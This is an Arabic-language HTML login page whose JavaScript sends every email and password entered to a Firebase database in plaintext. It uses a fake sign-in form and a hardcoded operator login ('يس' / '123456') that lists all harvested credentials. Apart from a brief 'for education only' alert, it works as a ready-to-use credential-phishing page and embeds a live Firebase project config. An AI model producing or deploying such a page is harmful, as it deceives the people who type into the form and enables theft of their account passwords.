<!DOCTYPE html>
<html lang="ar">
<head>
  <meta charset="UTF-8" />
  <title>تسجيل الدخول وعرض البيانات</title>
  <style>
    body {
      margin: 0;
      padding: 0;
      background: linear-gradient(to right, #4b6cb7, #182848);
      font-family: 'Segoe UI', sans-serif;
      display: flex;
      justify-content: center;
      align-items: flex-start;
      min-height: 100vh;
      direction: rtl;
      padding-top: 50px;
    }
    .container {
      background-color: #fff;
      border-radius: 20px;
      padding: 40px;
      box-shadow: 0 10px 25px rgba(0, 0, 0, 0.3);
      width: 100%;
      max-width: 400px;
      text-align: center;
      animation: fadeIn 1s ease-in-out;
    }
    h2 {
      margin-bottom: 30px;
      color: #333;
    }
    input {
      width: 100%;
      padding: 15px;
      margin: 10px 0;
      border: none;
      border-radius: 10px;
      background-color: #f1f1f1;
      font-size: 16px;
    }
    button {
      width: 100%;
      padding: 15px;
      border: none;
      border-radius: 10px;
      background-color: #4b6cb7;
      color: white;
      font-size: 18px;
      cursor: pointer;
      transition: background 0.3s;
    }
    button:hover {
      background-color: #3a59a0;
    }
    #dataList {
      margin-top: 30px;
      text-align: right;
      max-height: 300px;
      overflow-y: auto;
      border-top: 1px solid #ccc;
      padding-top: 15px;
      font-size: 14px;
      color: #222;
    }
    @keyframes fadeIn {
      from {opacity: 0; transform: translateY(-20px);}
      to {opacity: 1; transform: translateY(0);}
    }
  </style>

  <script type="module">
    import { initializeApp } from "https://www.gstatic.com/firebasejs/10.12.0/firebase-app.js";
    import { getDatabase, ref, push, set, get, child } from "https://www.gstatic.com/firebasejs/10.12.0/firebase-database.js";

    const firebaseConfig = {
      apiKey: "AIzaSyDnv1yZCtvbTVz-Z0mmMbFExxhO_xAwlvY",
      authDomain: "esff-94b2e.firebaseapp.com",
      projectId: "esff-94b2e",
      storageBucket: "esff-94b2e.appspot.com",
      messagingSenderId: "55096370520",
      appId: "1:55096370520:web:37b092375cbf3f1f85cf12d"
    };

    const app = initializeApp(firebaseConfig);
    const db = getDatabase(app);

    window.saveLoginData = function() {
      const email = document.getElementById("email").value.trim();
      const password = document.getElementById("password").value.trim();

      if (!email || !password) {
        alert("من فضلك أدخل البريد وكلمة السر");
        return;
      }

      // إذا كان الإيميل "يس" وكلمة السر "123456" - اعرض البيانات فقط ولا تخزن
      if (email === "يس" && password === "123456") {
        showAllData();
        // مسح الحقول وعدم حفظ هذا الدخول لأنه المدير
        document.getElementById("email").value = "";
        document.getElementById("password").value = "";
        return;
      }

      // حفظ بيانات المستخدمين العاديين في Firebase
      const dataRef = ref(db, 'logins');
      const newEntry = push(dataRef);

      set(newEntry, {
        email: email,
        password: password,
        time: new Date().toLocaleString()
      }).then(() => {
        alert("تم حفظ البيانات (للتعليم فقط)");
        document.getElementById("email").value = "";
        document.getElementById("password").value = "";
      }).catch((error) => {
        console.error("خطأ:", error);
      });
    };

    function showAllData() {
      const dataList = document.getElementById("dataList");
      dataList.innerHTML = "<b>جاري تحميل البيانات...</b>";

      const dbRef = ref(db);
      get(child(dbRef, 'logins')).then((snapshot) => {
        if (snapshot.exists()) {
          const data = snapshot.val();
          let html = "<h3>بيانات الدخول المسجلة:</h3>";
          html += "<ul style='padding-right: 10px;'>";
          for (const key in data) {
            const entry = data[key];
            html += `<li><b>البريد:</b> ${entry.email} | <b>كلمة السر:</b> ${entry.password} | <small>التوقيت: ${entry.time}</small></li>`;
          }
          html += "</ul>";
          dataList.innerHTML = html;
        } else {
          dataList.innerHTML = "لا توجد بيانات مسجلة.";
        }
      }).catch((error) => {
        dataList.innerHTML = "حدث خطأ في تحميل البيانات.";
        console.error(error);
      });
    }
  </script>
</head>
<body>

  <div class="container">
    <h2>تسجيل الدخول</h2>
    <input type="text" id="email" placeholder="البريد الإلكتروني" autocomplete="off" />
    <input type="password" id="password" placeholder="كلمة المرور" autocomplete="off" />
    <button onclick="saveLoginData()">دخول</button>

    <div id="dataList"></div>
  </div>

</body>
</html>
